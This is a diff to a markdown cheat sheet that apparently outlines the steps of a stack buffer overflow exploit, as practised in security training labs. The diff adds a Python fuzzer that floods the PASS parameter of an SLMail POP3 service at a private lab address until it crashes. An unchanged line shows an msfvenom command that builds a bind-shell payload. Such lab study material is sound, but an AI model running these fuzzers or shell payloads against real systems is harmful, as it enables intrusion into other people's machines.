@@ -12,10 +12,37 @@ s_string_variable("0")
 RESULT: SEGMENTATION FAULT
 
 ## 2- TEST SIZES
+``` 
+#!/usr/bin/python
+import socket
+# Script for Fuzzing SLMail POP3 Service's PASS Parameter
+counter = 100
+while counter <= 3500:
+	try:
+		buffer = "A" * counter
 
-Python script 1
+		print "Fuzzing PASS with %s bytes" % len(buffer)
 
-RESULT: EIP OVERWRITE (41414141)
+		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(30)
+		connect=s.connect(('192.168.1.200',110))
+		s.recv(1024)
+
+		s.send('USER test\r\n')
+		s.recv(1024)
+	
+		s.send('PASS ' + buffer + '\r\n')
+	
+		s.send('QUIT\r\n')
+		s.close()
+		counter = counter + 200
+	except socket.timeout:
+		print "\nCrash Byte of PASS Parameter: %s" %  (len(buffer)-200)
+		exit(0)
+
+```
+
+RESULT: EIP OVERWRITE WITH "A" (41414141)
 
 ## 3- LOCATE OFFSET 
 
@@ -34,13 +61,13 @@ RESULT: OFFSET
 
 PAYLOAD = A*[OFFSET] + B*4 + C*[FILL VALUE]
 
-RESULT: EIP VALUE = 42424242
+RESULT: EIP OVERWRITE WITH "B" = 42424242
 
 ## 5- SHELLCODE SPACE
 
 TEST SOME LENGTHS FOR "C":
 
-PAYLOAD = A*[OFFSET] + B*4 + C*[FILL SIZE 1] ==> EIP NOT 42424242
+PAYLOAD = A*[OFFSET] + B*4 + C*[FILL SIZE 1] ==> EIP IS NOT 42424242
 
 PAYLOAD = A*[OFFSET] + B*4 + C*[FILL SIZE 2] ==> EIP 424242
 
@@ -58,7 +85,7 @@ msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e 
 
 ## 8- LOCATE JMP JUMP
 
-{MONA}
+!mona modules (look for modules without protection)
 
 ## 9- COMPOSE FINAL EXPLOIT
 
